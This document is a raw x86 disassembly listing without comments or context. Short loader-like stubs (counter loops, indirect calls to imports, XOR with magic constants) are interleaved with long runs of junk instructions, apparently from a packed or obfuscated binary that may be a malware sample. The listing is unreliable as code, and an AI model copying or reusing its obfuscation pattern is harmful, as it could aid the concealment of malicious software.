  4074c6:	cmp    BYTE PTR ds:[ecx],cl
  4074c9:	sub    BYTE PTR [ebx+0x12],0xca
  4074cd:	scas   al,BYTE PTR es:[edi]
  4074ce:	mov    eax,0x1b82fd2c
  4074d3:	call   0x398e429d
  4074d8:	sbb    al,0x9
  4074da:	sub    DWORD PTR [eax-0x21],0xffffff8f
  4074de:	je     0x40747e
  4074e0:	or     ebx,DWORD PTR [edx+0x7a]
  4074e3:	daa    
  4074e4:	inc    esi
  4074e5:	pop    edi
  4074e6:	cwde   
  4074e7:	mov    ?,esp
  4074e9:	cli    
  4074ea:	pushf  
  4074eb:	(bad)  
  4074ed:	cmc    
  4074ee:	into   
  4074ef:	mov    ah,BYTE PTR [edx]
  4074f1:	mov    bh,0x61
  4074f3:	jmp    0x2720e93c
  4074f8:	add    DWORD PTR [ecx+0x38],edx
  4074fb:	(bad)  
  4074fc:	lods   eax,DWORD PTR ds:[si]
  4074fe:	pop    ebx
  4074ff:	xchg   edi,eax
  407500:	ret    
  407501:	ins    DWORD PTR es:[edi],dx
  407502:	xor    al,0xfb
  407504:	popa   
  407505:	add    eax,DWORD PTR [ebp-0x587702d0]
  40750b:	imul   DWORD PTR [eax]
  40750d:	neg    DWORD PTR [edx]
  40750f:	sbb    eax,0x5ce45fa2
  407514:	sar    bh,cl
  407516:	dec    esp
  407517:	mov    al,ds:0x645c2825
  40751c:	sahf   
  40751d:	in     al,0x16
  40751f:	ds push ebx
  407521:	xlat   BYTE PTR ds:[ebx]
  407522:	dec    edi
  407523:	push   ebp
  407524:	jnp    0x407581
  407526:	jecxz  0x407515
  407528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407529:	out    0xd1,al
  40752b:	cmp    al,BYTE PTR [edx]
  40752d:	sub    edx,DWORD PTR [eax-0x4d]
  407530:	mov    cl,0x35
  407532:	call   0x6e40:0x3269f993
  407539:	ja     0x40756f
  40753b:	xor    bh,BYTE PTR [ecx-0x5c]
  40753e:	pop    esi
  40753f:	mov    eax,DWORD PTR [ebp+0x8]
  407542:	add    ecx,DWORD PTR ds:0x44b6e0
  407548:	mov    DWORD PTR [ebp-0x20],eax
  40754b:	sbb    ecx,0x41ef
  407551:	push   ebx
  407552:	lea    eax,[ebp-0x18]
  407555:	mov    DWORD PTR [ebp-0x1c],eax
  407558:	mov    eax,DWORD PTR [ebp-0x1c]
  40755b:	adc    DWORD PTR ds:0x44e410,ecx
  407561:	push   esi
  407562:	push   edi
  407563:	mov    edi,0xf89f2dad
  407568:	or     DWORD PTR ds:0x44b6d8,0x25a
  407572:	mov    DWORD PTR [eax],edi
  407574:	mov    eax,DWORD PTR [ebp-0x14]
  407577:	mov    ebx,DWORD PTR [ebp-0x8]
  40757a:	and    esi,0x501d
  407580:	mov    ecx,0x7510857
  407585:	xor    eax,ecx
  407587:	and    DWORD PTR ds:0x424858,0x0
  407591:	xor    esi,esi
  407593:	or     esi,DWORD PTR ds:0x424858
  407599:	inc    esi
  40759a:	mov    DWORD PTR ds:0x424858,esi
  4075a0:	cmp    DWORD PTR ds:0x424858,0x24
  4075a7:	jne    0x4075b8
  4075ad:	push   0x41088a
  4075b2:	call   DWORD PTR ds:0x443374
  4075b8:	cmp    DWORD PTR ds:0x424858,0x18
  4075bf:	jb     0x407591
  4075c5:	mov    esi,0x32729e
  4075ca:	adc    DWORD PTR ds:0x44e418,0x44e40c
  4075d4:	jmp    0x40770b
  4075d9:	adc    dh,al
  4075db:	in     al,0x9d
  4075dd:	data16 jge 0x407635
  4075e0:	mov    ebx,0x5b1ba91b
  4075e5:	jns    0x4075e9
  4075e7:	xchg   edi,eax
  4075e8:	sahf   
  4075e9:	mov    cl,0x33
  4075eb:	jl     0x407669
  4075ed:	push   es
  4075ee:	jg     0x40766c
  4075f0:	jl     0x4075f9
  4075f2:	ins    BYTE PTR es:[edi],dx
  4075f3:	enter  0x5a36,0x6
  4075f7:	mov    ds:0x972f2ca7,al
  4075fc:	cwde   
  4075fd:	cmp    BYTE PTR ds:[esi-0x32],0xfb
  407602:	cmp    ebp,DWORD PTR [ecx-0x2]
  407605:	pushf  
  407606:	out    dx,al
  407607:	sbb    ecx,edi
  407609:	daa    
  40760a:	lea    esp,[eax+0x3d2f963f]
  407610:	adc    esp,DWORD PTR [ebp+0x3f44b00c]
  407616:	inc    esp
  407617:	sar    DWORD PTR [ecx+0x1],1
  40761a:	inc    eax
  40761b:	sbb    eax,0x6c9dbb36
  407620:	pop    ebx
  407621:	gs mov dl,0xb1
  407624:	loopne 0x4076a1
  407626:	xchg   edx,eax
  407627:	scas   eax,DWORD PTR es:[edi]
  407628:	jge    0x6f54261c
  40762e:	xor    eax,0x17e94872
  407633:	sti    
  407634:	into   
  407635:	in     al,0xef
  407637:	sahf   
  407638:	or     eax,0xe8ddf677
  40763d:	int3   
  40763e:	jle    0x407693
  407640:	mov    cl,0x3d
  407642:	pop    ss
  407643:	jno    0x407695
  407645:	fnsave [ebx]
  407647:	test   ch,al
  407649:	inc    ebp
  40764a:	cdq    
  40764b:	pop    eax
  40764c:	push   esp
  40764d:	rcr    DWORD PTR [ebx+0x4f],0x3
  407651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407652:	mov    ds:0xbf697351,eax
  407657:	and    cl,BYTE PTR [edx+0x747a7c58]
  40765d:	mov    eax,ds:0x2179f70d
  407662:	sbb    esp,0x66
  407665:	jmp    0x9eb69fa1
  40766a:	retf   
  40766b:	jno    0x4076b9
  40766d:	xor    eax,0xec2d1f68
  407672:	pop    ss
  407673:	mov    esi,0x7036b669
  407678:	and    al,bl
  40767a:	test   al,0xc1
  40767c:	xchg   esp,eax
  40767d:	es loop 0x40767c
  407680:	loopne 0x407677
  407682:	and    al,0x9
  407684:	lds    esi,FWORD PTR [ecx]
  407686:	pop    es
  407687:	inc    edx
  407688:	outs   dx,BYTE PTR ds:[esi]
  407689:	(bad)  
  40768a:	(bad)  
  40768b:	and    BYTE PTR [esp+eiz*8],dl
  40768e:	pushf  
  40768f:	sub    al,BYTE PTR [esi+0x6e92f9d4]
  407695:	pop    ebx
  407696:	or     BYTE PTR [ecx],bl
  407698:	out    0x1e,eax
  40769a:	push   cs
  40769b:	mov    edx,?
  40769d:	mov    edi,0xba98a4d4
  4076a2:	jecxz  0x4076af
  4076a4:	dec    esp
  4076a5:	mov    al,0x54
  4076a7:	jb     0x4076b7
  4076a9:	mov    DWORD PTR [edx+0x8464056],edi
  4076af:	push   ds
  4076b0:	push   edx
  4076b1:	inc    ebp
  4076b2:	and    eax,0x60b77746
  4076b7:	data16 cmc 
  4076b9:	sbb    al,0x49
  4076bb:	mov    edi,0x99a9a8be
  4076c0:	jae    0x40773d
  4076c2:	popa   
  4076c3:	call   FWORD PTR [eax]
  4076c5:	adc    esi,DWORD PTR [edx+0x50]
  4076c8:	sbb    BYTE PTR [ecx+ecx*4-0x6761728e],ah
  4076cf:	mov    al,0x3f
  4076d1:	add    eax,0x89e22450
  4076d6:	xchg   DWORD PTR [esi-0x31],ecx
  4076d9:	fcmovnu st,st(0)
  4076db:	enter  0x2482,0xd2
  4076df:	push   esp
  4076e0:	mov    ?,WORD PTR [ebx-0x52bcec1e]
  4076e6:	and    eax,DWORD PTR [ecx]
  4076e8:	add    ecx,eax
  4076ea:	sbb    eax,0xd5f3ff22
  4076ef:	mov    ebp,DWORD PTR [eax+edi*4-0x3f796ce9]
  4076f6:	dec    edi
  4076f7:	fsub   DWORD PTR ds:0xb124010d
  4076fd:	icebp  
  4076fe:	adc    al,0x2
  407700:	out    0xde,eax
  407702:	mov    ebp,0x963943f7
  407707:	stc    
  407708:	jl     0x407737
  40770a:	jl     0x40773f
  40770c:	fld    st(7)
  40770e:	add    eax,0x41075b
  407713:	sbb    eax,0x33000075
  407718:	rol    BYTE PTR [ecx+0x44898005],cl
  40771e:	add    dl,bl
  407720:	push   cs
  407721:	add    BYTE PTR [eax],al
  407723:	add    eax,esi
  407725:	and    DWORD PTR ds:0x448980,0x424854
  40772f:	add    ebx,esi
  407731:	mov    DWORD PTR ds:0x448988,0x5df4
  40773b:	jmp    0x407872
  407740:	ss push 0x77
  407743:	call   0x6b2de4f3
  407748:	pop    ecx
  407749:	fcom   st(3)
  40774b:	xor    al,0x2e
  40774d:	sub    DWORD PTR [ebp+0x2],edi
  407750:	pop    ebx
  407751:	xor    bh,BYTE PTR [esp+edi*2+0x6]
  407755:	jg     0x4077d3
  407757:	jl     0x40772e
  407759:	iret   
  40775a:	jmp    0x89b6ced5
  40775f:	push   0x6e
  407761:	fstp   DWORD PTR [ecx-0x4bab8bc4]
  407767:	adc    BYTE PTR [ebp-0x29],ch
  40776a:	cs mov ch,0x37
  40776d:	sub    eax,DWORD PTR [ebx+0x5f10af16]
  407773:	and    esi,DWORD PTR [ebp+0x4c0a1bd4]
  407779:	lds    edi,FWORD PTR [edi]
  40777b:	idiv   esi
  40777d:	(bad)  
  40777e:	not    BYTE PTR [esi-0x1ea8ae47]
  407784:	cdq    
  407785:	push   eax
  407786:	inc    esi
  407787:	(bad)
  40778a:	leave  
  40778b:	push   edx
  40778c:	popa   
  40778d:	sbb    BYTE PTR ss:0xd7f1746e,ch
  407794:	xor    dh,BYTE PTR [ecx]
  407796:	pop    ecx
  407797:	lds    ebx,FWORD PTR [ecx+edi*4]
  40779a:	int3   
  40779b:	ja     0x407775
  40779d:	xchg   ebx,eax
  40779e:	mov    dh,dl
  4077a0:	inc    ecx
  4077a1:	sub    eax,0x76a94a79
  4077a6:	sub    edi,0xc10ed36b
  4077ac:	jo     0x40778a
  4077ae:	inc    edx
  4077af:	ins    BYTE PTR es:[edi],dx
  4077b0:	not    DWORD PTR [edx]
  4077b2:	test   DWORD PTR [ebp*1-0x1073b10a],edi
  4077b9:	mov    ecx,0x34580af
  4077be:	mov    ds:0x7214943c,al
  4077c3:	clc    
  4077c4:	shl    DWORD PTR [ebp+ecx*2+0x1cf62a63],0x3
  4077cc:	xchg   esp,eax
  4077cd:	(bad)  
  4077ce:	ror    al,cl
  4077d0:	jg     0x4077a0
  4077d2:	aad    0x37
  4077d4:	push   es
  4077d5:	ja     0x4077c6
  4077d7:	xchg   esi,eax
  4077d8:	bound  ecx,QWORD PTR [esi-0x43]
  4077db:	cs jge 0x4077d3
  4077de:	fwait
  4077df:	jmp    0xd8d55c0b
  4077e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077e5:	out    0xcd,eax
  4077e7:	(bad)  
  4077e8:	jmp    0x77bd852b
  4077ed:	mov    bl,0x6e
  4077ef:	mov    esp,0xb49b3d76
  4077f4:	jle    0x407857
  4077f6:	adc    cl,BYTE PTR [edi+0x3d57850]
  4077fc:	bound  ebp,QWORD PTR [ecx*4-0x304c677c]
  407803:	inc    esp
  407804:	push   eax
  407805:	pop    ebp
  407806:	cdq    
  407807:	fwait
  407808:	cmp    al,0xd5
  40780a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40780b:	ret    0xd3
  40780e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40780f:	jo     0x4077de
  407811:	test   edi,edx
  407813:	data16 sub al,0x3d
  407816:	mov    ds:0x58a11fdf,eax
  40781b:	mov    ebp,0x6f2c0fe6
  407820:	cld    
  407821:	jmp    0x4077d4
  407823:	std    
  407824:	aaa    
  407825:	aam    0xd6
  407827:	inc    eax
  407828:	fwait
  407829:	in     eax,dx
  40782a:	jecxz  0x407876
  40782c:	mov    ah,BYTE PTR ds:0xa2624603
  407832:	iret   
  407833:	cdq    
  407834:	mov    esp,ebx
  407836:	imul   edx,ebx,0x6e
  407839:	push   ss
  40783a:	aas    
  40783b:	mov    edx,ecx
  40783d:	scas   al,BYTE PTR es:[edi]
  40783e:	call   0xac20:0x37e0c13b
  407845:	xchg   ecx,eax
  407846:	aad    0x4b
  407848:	data16 fisttp QWORD PTR [ebp-0x60]
  40784c:	out    dx,eax
  40784d:	bound  eax,QWORD PTR [ecx+0x34]
  407850:	inc    edx
  407851:	inc    ebx
  407852:	je     0x407893
  407854:	(bad)  
  407855:	fist   DWORD PTR [esi]
  407857:	inc    ebx
  407858:	mov    ah,0xc1
  40785a:	xchg   edi,eax
  40785b:	outs   dx,DWORD PTR ds:[esi]
  40785c:	int3   
  40785d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40785e:	lea    eax,[esi+0x71facf43]
  407864:	jmp    FWORD PTR [edi]
  407866:	pop    esp
  407867:	fisttp WORD PTR [ebp+0x39d2bbc7]
  40786d:	ret    
  40786e:	stos   BYTE PTR es:[edi],al
  40786f:	mov    WORD PTR [edi],gs
  407871:	jecxz  0x40786a
  407873:	repz mov edx,DWORD PTR ds:0x424844
  40787a:	mov    edx,DWORD PTR [ebp-0x20]
  40787d:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  407884:	mov    DWORD PTR ds:0x44b6e8,0x3c9f
  40788e:	cmp    eax,DWORD PTR [edx]
  407890:	je     0x408082
  407896:	mov    edx,DWORD PTR ds:0x410743
  40789c:	and    DWORD PTR ds:0x44e418,edx
  4078a2:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4078a9:	and    DWORD PTR ds:0x424848,0x0
  4078b3:	mov    edx,DWORD PTR ds:0x424848
  4078b9:	inc    edx
  4078ba:	mov    DWORD PTR ds:0x424848,edx
  4078c0:	cmp    DWORD PTR ds:0x424848,0x16
  4078c7:	jne    0x4078f0
  4078cd:	push   DWORD PTR [ebp-0x20]
  4078d0:	push   0x3477
  4078d5:	push   0x4489a0
  4078da:	push   DWORD PTR [ebp-0x10]
  4078dd:	push   0x7aad
  4078e2:	push   0x3f84
  4078e7:	push   DWORD PTR [ebp-0x1c]
  4078ea:	call   DWORD PTR ds:0x443014
  4078f0:	cmp    DWORD PTR ds:0x424848,0x13
  4078f7:	jb     0x4078b3
  4078fd:	lea    eax,[ebp-0xc]
  407900:	mov    DWORD PTR [ebp-0x10],eax
  407903:	xor    edx,edx
  407905:	xor    edx,DWORD PTR ds:0x4454e4
  40790b:	mov    eax,ds:0x4489b8
  407910:	sub    edx,eax
  407912:	xor    edx,DWORD PTR [edx+eax*1]
  407915:	jmp    0x407a4c
  40791a:	lea    eax,[eax+ebx*1]
  40791d:	mov    WORD PTR [ebp+0x1d8d80],ds
  407923:	std    
  407924:	inc    esi
  407925:	nop
  407926:	shl    DWORD PTR [eax+0x3565a346],0x7c
  40792d:	jl     0x407935
  40792f:	jg     0x4079ad
  407931:	jl     0x4078c3
  407933:	mov    bl,0x3f
  407935:	mov    dl,BYTE PTR es:[ebp-0x75]
  407939:	jg     0x407961
  40793b:	nop
  40793c:	pop    ebp
  40793d:	ss pop ecx
  40793f:	aam    0xe8
  407941:	push   edi
  407942:	adc    al,0x1d
  407944:	push   ecx
  407945:	aaa    
  407946:	xchg   edx,eax
  407947:	push   ss
  407948:	clc    
  407949:	lock xor BYTE PTR ds:[eax+0x16],0xfb
  40794f:	sbb    eax,0x3f9f1bcd
  407954:	pop    ss
  407955:	or     DWORD PTR [eax+0x20d8c1af],edi
  40795b:	sbb    al,BYTE PTR [ecx+ebp*4+0x32]
  40795f:	jne    0x407989
  407961:	jp     0x40798e
  407963:	(bad)  
  407964:	jmp    0x407981
  407966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407967:	js     0x407907
  407969:	aad    0x5a
  40796b:	and    DWORD PTR [ebp-0x79],esi
  40796e:	adc    al,0xf1
  407970:	cmp    ch,bl
  407972:	dec    ecx
  407973:	retf   
  407974:	sub    BYTE PTR [esi+0x55f7858c],dh
  40797a:	or     ah,BYTE PTR [esi+ecx*8]
  40797d:	xchg   edx,eax
  40797e:	data16 and al,0x48
  407981:	mov    ebx,0x9bfb3668
  407986:	push   ss
  407987:	push   edi
  407988:	lea    ebx,[esi+0x32]
  40798b:	ins    DWORD PTR es:[edi],dx
  40798c:	inc    eax
  40798d:	ja     0x407a00
  40798f:	(bad)  
  407990:	stos   DWORD PTR es:[edi],eax
  407991:	cmp    eax,0xdbb58574
  407996:	jne    0x40798a
  407998:	adc    DWORD PTR [ebp-0x37],ecx
  40799b:	xor    eax,0x661189bc
  4079a0:	lock repz test BYTE PTR [edx+0x49],0xb
  4079a6:	aam    0x90
  4079a8:	or     esp,edi
  4079aa:	push   edi
  4079ab:	icebp  
  4079ac:	outs   dx,DWORD PTR ds:[esi]
  4079ad:	inc    esp
  4079ae:	mov    WORD PTR es:[ebp-0x51],ss
  4079b2:	push   es
  4079b3:	lahf   
  4079b4:	jnp    0x407977
  4079b6:	call   0xdcf9db32
  4079bb:	mov    BYTE PTR [edi],al
  4079bd:	pop    es
  4079be:	pop    ds
  4079bf:	mov    al,0xcc
  4079c1:	xchg   esi,eax
  4079c2:	cdq    
  4079c3:	inc    ebx
  4079c4:	mov    ebp,0x76e0efe4
  4079c9:	mov    ah,0x90
  4079cb:	dec    ecx
  4079cc:	mov    edi,0x1837b4e4
  4079d1:	jo     0x4079c2
  4079d3:	out    dx,eax
  4079d4:	(bad)  
  4079d5:	sub    eax,0xf61071c2
  4079da:	scas   al,BYTE PTR es:[edi]
  4079db:	pop    ecx
  4079dc:	xlat   BYTE PTR ds:[ebx]
  4079dd:	mov    eax,0x6a362888
  4079e2:	iret   
  4079e3:	jbe    0x4079e4
  4079e5:	xchg   edx,eax
  4079e6:	and    ch,cl
  4079e8:	jecxz  0x40797f
  4079ea:	sub    BYTE PTR [eax+esi*2+0x7b],al
  4079ee:	and    ecx,esp
  4079f0:	in     al,dx
  4079f1:	loopne 0x4079fb
  4079f3:	jl     0x407a01
  4079f5:	pop    ss
  4079f6:	add    dl,BYTE PTR [esi]
  4079f8:	jle    0x407a3b
  4079fa:	inc    ebp
  4079fb:	or     edx,esi
  4079fd:	lods   eax,DWORD PTR ds:[esi]
  4079fe:	fsubr  QWORD PTR [esi+ebp*1]
  407a01:	aad    0x8b
  407a03:	imul   edi,DWORD PTR [edx],0x71
  407a06:	fsubr  st,st(3)
  407a08:	ror    DWORD PTR [ebx-0x4e],0x46
  407a0c:	stc    
  407a0d:	(bad)  
  407a0e:	xlat   BYTE PTR ds:[ebx]
  407a0f:	aad    0x62
  407a11:	fldenv [eax-0x7e25bb97]
  407a17:	jmp    FWORD PTR [edx+0x7e]
  407a1a:	(bad)  
  407a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a1c:	leave  
  407a1d:	clc    
  407a1e:	pop    ds
  407a1f:	pop    ebp
  407a20:	mov    esi,0xa44fd90f
  407a25:	stos   BYTE PTR es:[edi],al
  407a26:	sbb    esp,DWORD PTR [esi+0x37]
  407a29:	adc    eax,0xc178244
  407a2e:	gs pop edi
  407a30:	ins    DWORD PTR es:[edi],dx
  407a31:	pop    esp
  407a32:	dec    eax
  407a33:	leave  
  407a34:	rcr    BYTE PTR [ecx+0x1234eac2],0xd7
  407a3b:	lock in al,dx
  407a3d:	jo     0x407a84
  407a3f:	lods   eax,DWORD PTR ds:[esi]
  407a40:	xchg   edx,eax
  407a41:	fs cmp al,0xcd
  407a44:	inc    edi
  407a45:	add    BYTE PTR [ecx],ch
  407a47:	jp     0x407a8b
  407a49:	outs   dx,DWORD PTR ds:[esi]
  407a4a:	jg     0x407abc
  407a4c:	mov    eax,DWORD PTR [ebp-0x10]
  407a4f:	mov    DWORD PTR ds:0x448994,0x1e
  407a59:	cmp    DWORD PTR ds:0x448994,0x0
  407a60:	je     0x407aad
  407a66:	cmp    DWORD PTR ds:0x448994,0x10
  407a6d:	jne    0x407a7f
  407a73:	push   DWORD PTR [ebp-0x1c]
  407a76:	push   DWORD PTR [ebp-0x18]
  407a79:	call   DWORD PTR ds:0x443018
  407a7f:	cmp    DWORD PTR ds:0x448994,0x11
  407a86:	jne    0x407a99
  407a8c:	mov    edx,DWORD PTR ds:0x448994
  407a92:	dec    edx
  407a93:	mov    DWORD PTR ds:0x448994,edx
  407a99:	xor    edx,edx
  407a9b:	add    edx,DWORD PTR ds:0x448994
  407aa1:	dec    edx
  407aa2:	mov    DWORD PTR ds:0x448994,edx
  407aa8:	jmp    0x407a59
  407aad:	mov    edx,DWORD PTR [eax]
  407aaf:	imul   edx,edx,0xf89ea9e0
  407ab5:	mov    DWORD PTR [eax],edx
  407ab7:	mov    eax,DWORD PTR [ebp-0xc]
  407aba:	cmp    eax,0x1fe34420
  407abf:	je     0x407c13
  407ac5:	mov    eax,DWORD PTR [ebp-0x1c]
  407ac8:	jmp    0x407bff
  407acd:	(bad)  
  407ace:	fsub   DWORD PTR [edx+0x76]
  407ad1:	jp     0x407a69
  407ad3:	jp     0x407b2d
  407ad5:	mov    ch,0xbf
  407ad7:	xchg   ebp,eax
  407ad8:	fcomip st,st(7)
  407ada:	sbb    eax,0x370fdb4c
  407adf:	jl     0x407b5d
  407ae1:	push   es
  407ae2:	jg     0x407b60
  407ae4:	jl     0x407b58
  407ae6:	out    dx,al
  407ae7:	adc    ebx,DWORD PTR [ebx+0x50ecf66b]
  407aed:	push   edi
  407aee:	outs   dx,BYTE PTR ds:[esi]
  407aef:	and    eax,0x4ddd165d
  407af4:	xchg   ecx,eax
  407af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407af6:	ret    0x4048
  407af9:	sub    BYTE PTR [esi-0x1801ca5c],bl
  407aff:	mov    eax,0x407fcfee
  407b04:	sub    BYTE PTR [ecx-0x57],bl
  407b07:	(bad)  [ebx+0x470ad44d]
  407b0d:	pop    es
  407b0e:	adc    DWORD PTR [eax-0x769a5e9d],esp
  407b14:	bound  edi,QWORD PTR [edi+eiz*1]
  407b17:	dec    edi
  407b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b19:	push   es
  407b1a:	mov    al,0xc0
  407b1c:	push   0x71a6afda
  407b21:	not    BYTE PTR [esp+esi*4+0x55]
  407b25:	pop    es
  407b26:	call   0xd910:0xb447462
  407b2d:	jns    0x407b1b
  407b2f:	popa   
  407b30:	pop    ebx
  407b31:	xor    eax,0x91bd1059
  407b36:	and    dl,ch
  407b38:	cs ja  0x407b6b
  407b3b:	cmp    ebp,DWORD PTR [eax+0x6127afe0]
  407b41:	pop    ebx
  407b42:	js     0x407b52
  407b44:	pop    eax
  407b45:	popa   
  407b46:	sub    DWORD PTR [edi+0x679343d3],0xffffff84
  407b4d:	mul    BYTE PTR [edx]
  407b4f:	and    DWORD PTR [eax+0x6c395e71],0x23
  407b56:	clc    
  407b57:	sub    ecx,DWORD PTR [edi]
  407b59:	inc    ebp
  407b5a:	xlat   BYTE PTR ds:[ebx]
  407b5b:	in     eax,0x62
  407b5d:	ret    0x6bb1
  407b60:	mov    esi,0x54ec92ce
  407b65:	imul   al
  407b67:	or     esi,ebp
  407b69:	adc    eax,0x7b39bdcc
  407b6e:	pop    esp
  407b6f:	fist   DWORD PTR [edx]
  407b71:	mov    eax,ds:0xa25e17b9
  407b76:	out    0x74,eax
  407b78:	mov    cl,0x46
  407b7a:	lock push eax
  407b7c:	mov    edx,0xa91a56d7
  407b81:	mov    al,0x46
  407b83:	push   ecx
  407b84:	xchg   edx,eax
  407b85:	xor    al,0xdc
  407b87:	jge    0x407bae
  407b89:	push   ds
  407b8a:	hlt    
  407b8b:	fwait
  407b8c:	mov    ds:0x9ca6b77f,al
  407b91:	ins    DWORD PTR es:[edi],dx
  407b92:	retf   0xef7b
  407b95:	sub    dl,BYTE PTR [esi]
  407b97:	xlat   BYTE PTR ds:[ebx]
  407b98:	mov    ds:0x4f85acfd,eax
  407b9d:	jecxz  0x407bff
  407b9f:	sub    BYTE PTR [eax+0x1ccf608d],dh
  407ba5:	and    eax,0x63f0abd8
  407baa:	int    0x9d
  407bac:	inc    ebx
  407bad:	pop    ecx
  407bae:	stos   DWORD PTR es:[edi],eax
  407baf:	rol    DWORD PTR [esi+0x6c6a5144],cl
  407bb5:	pop    eax
  407bb6:	es jns 0x407c26
  407bb9:	push   eax
  407bba:	xchg   ebx,eax
  407bbb:	inc    ebp
  407bbc:	inc    ecx
  407bbd:	shr    bh,1
  407bbf:	mul    DWORD PTR [edx+0x68]
  407bc2:	out    dx,al
  407bc3:	sub    bl,BYTE PTR [eax+0x7f]
  407bc6:	ds inc ebp
  407bc8:	adc    eax,0x25e0c847
  407bcd:	scas   eax,DWORD PTR es:[edi]
  407bce:	mov    ds:0x43524f9d,eax
  407bd3:	cmp    DWORD PTR [esi],edx
  407bd5:	and    eax,0xfe844c7a
  407bda:	div    DWORD PTR ds:0x38ebc427
  407be0:	lods   al,BYTE PTR ds:[esi]
  407be1:	lods   al,BYTE PTR ds:[esi]
  407be2:	daa    
  407be3:	sahf   
  407be4:	(bad)  
  407be5:	shl    BYTE PTR [edi+0x72],1
  407be8:	inc    BYTE PTR [esi-0x39]
  407beb:	lds    ebx,FWORD PTR [ecx+0x76]
  407bee:	push   0x3d
  407bf0:	and    DWORD PTR [ecx-0x57e32c09],edi
  407bf6:	cmp    BYTE PTR [edi+0x26af26c0],ch
  407bfc:	mov    ebx,0x881dc3f
  407c01:	nop
  407c02:	sbb    al,0x75
  407c04:	pusha  
  407c05:	mov    eax,DWORD PTR [ebp-0x8]
  407c08:	xor    eax,ecx
  407c0a:	add    eax,esi
  407c0c:	pop    edi
  407c0d:	pop    esi
  407c0e:	pop    ebx
  407c0f:	leave  
  407c10:	ret    0x4
  407c13:	mov    eax,DWORD PTR [ebp-0xc]
  407c16:	add    eax,DWORD PTR [ebp-0x18]
  407c19:	cmp    eax,0x188271cd
  407c1e:	je     0x407d69
  407c24:	mov    eax,DWORD PTR [ebp-0x10]
  407c27:	and    DWORD PTR [eax],0x751c9d
  407c2d:	jmp    0x407c05
  407c32:	jmp    0x407d69
  407c37:	jnp    0x407be9
  407c39:	lds    edx,FWORD PTR [eax+0x5b7da5fd]
  407c3f:	cmp    ah,BYTE PTR [ebp+0x70]
  407c42:	adc    eax,0x478e98a3
  407c47:	sub    DWORD PTR [esi],esi
  407c49:	jl     0x407cc7
  407c4b:	push   es
  407c4c:	jg     0x407cca
  407c4e:	jl     0x407cac
  407c50:	xchg   edx,eax
  407c51:	xchg   edi,eax
  407c52:	int    0x6c
  407c54:	div    dh
  407c56:	ja     0x407bf6
  407c58:	mov    al,ds:0x34768d65
  407c5d:	sub    al,0x4e
  407c5f:	mov    ah,0x6b
  407c61:	mov    al,ds:0x3a51d7cd
  407c66:	sub    bh,dl
  407c68:	scas   al,BYTE PTR es:[edi]
  407c69:	push   ss
  407c6a:	push   ebp
  407c6b:	enter  0x78dc,0x51
  407c6f:	call   0xa3b14650
  407c74:	mov    eax,ds:0x2f7a2f96
  407c79:	mov    edx,0xfe6d406
  407c7e:	rcl    BYTE PTR [ecx-0x39],0x55
  407c82:	loopne 0x407c99
  407c84:	jbe    0x407ca7
  407c86:	mov    bl,0xb4
  407c88:	push   cs
  407c89:	or     DWORD PTR [ebx+0x41],eax
  407c8c:	mov    esp,0x8a65444d
  407c91:	cmp    esi,DWORD PTR [ecx+0x26c70481]
  407c97:	xor    esi,0x3c
  407c9a:	js     0x407cb9
  407c9c:	(bad)  
  407c9d:	in     al,0xab
  407c9f:	xchg   edi,eax
  407ca0:	ins    BYTE PTR es:[edi],dx
  407ca1:	xchg   edx,eax
  407ca2:	or     dh,BYTE PTR [ecx+ecx*2+0x546b6fe6]
  407ca9:	lock std 
  407cab:	js     0x407cf0
  407cad:	in     al,dx
  407cae:	lods   eax,DWORD PTR ds:[esi]
  407caf:	xor    ebp,DWORD PTR [ebx-0x45]
  407cb2:	js     0x407c63
  407cb4:	mov    WORD PTR [ecx+0x12],?
  407cb7:	jns    0x407c4f
  407cb9:	mov    WORD PTR [esi],es
  407cbb:	test   eax,0xf9c742bf
  407cc0:	push   es
  407cc1:	adc    BYTE PTR [ebp-0x74],ch
  407cc4:	repz push ebx
  407cc6:	xor    dh,dh
  407cc8:	rcl    BYTE PTR [ebp+esi*2-0x6cb2915f],0x23
  407cd0:	loop   0x407d50
  407cd2:	mov    BYTE PTR [ecx-0x48],al
  407cd5:	xchg   ecx,eax
  407cd6:	fldcw  WORD PTR [eax+0x21ee6d02]
  407cdc:	test   al,0xdb
  407cde:	int    0x11
  407ce0:	or     eax,0x92fc0640
  407ce5:	(bad)  [ebp-0x3adc78b7]
  407ceb:	cmp    eax,0xfd456638
  407cf0:	xor    dl,BYTE PTR [ebx-0x5b6adf8a]
  407cf6:	repz push ds
  407cf8:	xchg   ebp,eax
  407cf9:	push   es
  407cfa:	jmp    0xfe29:0xadad6223
  407d01:	retf   0xaa3d
  407d04:	mov    DWORD PTR [ecx+0x67],edi
  407d07:	cld    
  407d08:	jns    0x407cd6
  407d0a:	cmp    dl,BYTE PTR [ebx*2+0x7a55d9ad]
  407d11:	jne    0x407cca
  407d13:	mov    BYTE PTR [ecx],ah
  407d15:	jb     0x407d47
  407d17:	and    esp,edi
  407d19:	jl     0x407d58
  407d1b:	pop    ebp
  407d1c:	cs repz (bad) 
  407d1f:	mov    ds:0xac03bbab,eax
  407d24:	sub    al,0xa
  407d26:	mov    al,0x23
  407d28:	inc    ebx
  407d29:	jno    0x407d97
  407d2b:	sbb    esi,DWORD PTR [ebx+0xc]
  407d2e:	cmp    BYTE PTR ds:[ebp+0x79],dh
  407d32:	mov    BYTE PTR [ebp+ebx*4-0x74],cl
  407d36:	mov    esp,0x9b7fbd2f
  407d3b:	dec    ebx
  407d3c:	jecxz  0x407d61
  407d3e:	push   esi
  407d3f:	shr    DWORD PTR [edx],cl
  407d41:	push   ebp
  407d42:	jnp    0x407d78
  407d44:	lods   eax,DWORD PTR ds:[esi]
  407d45:	jl     0x407d1c
  407d47:	stos   BYTE PTR es:[edi],al
  407d48:	jns    0x407d8c
